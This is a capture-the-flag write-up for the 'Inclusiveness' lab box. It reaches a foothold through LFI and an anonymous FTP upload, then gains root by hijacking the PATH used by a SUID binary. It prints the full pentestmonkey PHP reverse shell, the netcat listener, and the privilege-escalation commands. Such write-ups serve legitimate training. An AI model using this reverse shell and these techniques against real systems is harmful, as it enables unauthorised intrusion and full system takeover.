--------------------------------
# Inclusiveness Writeup
--------------------------------

## Info-sheet
- IP-address: 192.168.29.151
- DNS-Domain name: N/A
- Host name: Inclusiveness
- OS: Linux

## Overview
This box is good box that demonstrate common web dev vulns, gaining access by exploiting LFI on a secret page, then privilege escalation to root by exploiting local PATH variable.
-------
## Recon
-------
Services and ports:
```bash
kenobi@kenobi-attackbox:~$ sudo nmap -A -p 21,22,80 192.168.120.69
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-16 10:27 EDT
Nmap scan report for 192.168.120.69
Host is up (0.030s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Feb 08 21:51 pub [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.118.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 06:1b:a3:92:83:a5:7a:15:bd:40:6e:0c:8d:98:27:7b (RSA)
|   256 cb:38:83:26:1a:9f:d3:5d:d3:fe:9b:a1:d3:bc:ab:2c (ECDSA)
|_  256 65:54:fc:2d:12:ac:e1:84:78:3e:00:23:fb:e4:c9:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.4 (94%), Linux 2.6.18 - 2.6.22 
--SNIP--
kenobi@kenobi-attackbox:~$
```
## Web enumeration
Navigating to the default page on port 80 (http://192.168.120.69/) only shows the default Apache page. However, viewing robots.txt (http://192.168.120.69/robots.txt), we are greeted with the following:
```text
You are not a search engine! You can't read my robots.txt! 
```
You can just bypass this by changing your user-agent to `GoogleBot`, we now see
```text
User-agent: *
Disallow: /secret_information/
```
We discover a new directory: /secret_information/. Navigating there (http://192.168.120.69/secret_information/), we are met with a web page that describes "DNS Zone Transfer Attack". The web page contains two hyperlinks English and Spanish:
```text
DNS Zone Transfer Attack

english spanish
DNS Zone transfer is the process where a DNS server passes a copy of part of it's database 
(which is called a "zone") to another DNS server. It's how you can have more than one DNS server 
able to answer queries about a particular zone; there is a Master 
DNS server, and one or more Slave DNS servers, and the slaves 
ask the master for a copy of the records for that zone. A basic DNS Zone Transfer Attack 
isn't very fancy: you just pretend you are a slave and ask the master for a copy of the zone records. 
And it sends you them; DNS is one of those really old-school Internet protocols that was designed when 
everyone on the Internet literally knew everyone else's name and address, 
and so servers trusted each other implicitly. It's worth stopping zone transfer attacks, 
as a copy of your DNS zone may reveal a lot of topological information about your internal network. In particular, 
if someone plans to subvert your DNS, by poisoning or spoofing it, for example, they'll find having a copy 
of the real data very useful. So best practice is to restrict Zone transfers. At the bare minimum, you 
tell the master what the IP addresses of the slaves are and not to transfer to anyone else. In more 
sophisticated set-ups, you sign the transfers. So the more sophisticated zone transfer attacks try 
and get round these controls. 
```

## Foothold
### Port 80 - Web server
#### LFI Vulnerability

Clicking on the English hyperlink, the URI changes to http://192.168.120.69/secret_information/?lang=en.php.

We can exploit this LFI vulnerability by navigating to http://192.168.120.69/secret_information/?lang=/etc/passwd:
```bash
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin avahi-autoipd:x:107:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin sshd:x:110:65534::/run/sshd:/usr/sbin/nologin avahi:x:113:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:114:121::/var/lib/saned:/usr/sbin/nologin colord:x:115:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:116:123::/var/lib/geoclue:/usr/sbin/nologin tom:x:1000:1000:Tom,,,:/home/tom:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ftp:x:118:125:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 
```
We saw from the initial scan that the FTP service is available as anonymous and /pub is a writable directory. We will utilize LFI to disclose information in the vsftpd.conf config file via http://192.168.120.69/secret_information/?lang=/etc/vsftpd.conf and see the following at the end of the file:
```text
anon_root=/var/ftp/ write_enable=YES # 
```
--------
## Exploitation
--------

### Port 80 - Web server
#### Remote Code Execution

To achieve remote code execution, we will prepare a malicious PHP file and then upload it using anonymous FTP:
```php
kenobi@kenobi-attackbox:~$ cat rev.php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = 'your IP';
$port = 1337;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
We can verify RCE by navigating to http://192.168.120.69/secret_information/?lang=/var/ftp/pub/rev.php
If we look back to our listener, our shell should have arrived:
```bash
kenobi@kenobi-attackbox:~$ sudo nc -lvp 1337
listening on [any] 1337 …
192.168.249.14: inverse host lookup failed: Unknown host
connect to [192.168.49.249] from (UNKNOWN) [192.168.249.14] 52006
/bin/sh: 0: can’t access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@inclusiveness:/var/www/html/secret_information$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

------------
## Privilege Escalation
------------
### SUID
identify all programs or files that have SUID bits enabled:
```bash
www-data@inclusiveness:/var/www/html/secret_information$ find / -perm -u=s -type f 2>/dev/null
<_information$ find / -perm -u=s -type f 2>/dev/null     
...
/usr/sbin/pppd
/home/tom/rootshell
```

Immediately, /home/tom/rootshell sticks out. Inside /home/tom, we find an interesting binary rootshell with its source code in rootshell.c:
```bash
www-data@inclusiveness:/var/www/html/secret_information$ cd /home/tom && ls -la
...
-rwsr-xr-x  1 root root 16976 Feb  8 13:01 rootshell
-rw-r--r--  1 tom  tom    448 Feb  8 13:01 rootshell.c
```

source code:
```bash
www-data@inclusiveness:/home/tom$ cat rootshell.c
cat rootshell.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main() {

    printf("checking if you are tom...\n");
    FILE* f = popen("whoami", "r");

    char user[80];
    fgets(user, 80, f);

    printf("you are: %s\n", user);
    //printf("your euid is: %i\n", geteuid());

    if (strncmp(user, "tom", 3) == 0) {
        printf("access granted.\n");
        setuid(geteuid());
        execlp("sh", "sh", (char *) 0);
    }
}
```
Looking at the source code, if the file is executed as the user tom by calling the function for whoami program for validation, then we will get a privileged shell; else, it will print user-ID of the user that is currently logged in. In other words, the rootshell program gives a high privilege shell if the output of the whoami program is tom.

We can easily take advantage of this misconfiguration by abusing the local PATH variable. Here, we create a file named whoami in the /tmp directory and write the following bash code to print tom:
```bash
www-data@inclusiveness:/home/tom$ cd /tmp
cd /tmp
www-data@inclusiveness:/tmp$ echo "printf "tom"" > whoami
echo "printf "tom"" > whoami
www-data@inclusiveness:/tmp$ chmod 777 whoami
chmod 777 whoami
www-data@inclusiveness:/tmp$
```
next we add the temporary path
```bash
www-data@inclusiveness:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
www-data@inclusiveness:/tmp$ echo $PATH
echo $PATH
/tmp:/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin
www-data@inclusiveness:/tmp$ 
```
now we can execute root shell
```bash
www-data@inclusiveness:/tmp$ cd /home/tom
cd /home/tom
www-data@inclusiveness:/home/tom$ ./rootshell
./rootshell
checking if you are tom...
you are: tom
access granted.
# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

##### Rooted!

###### References
- https://www.offensive-security.com/labs/individual/
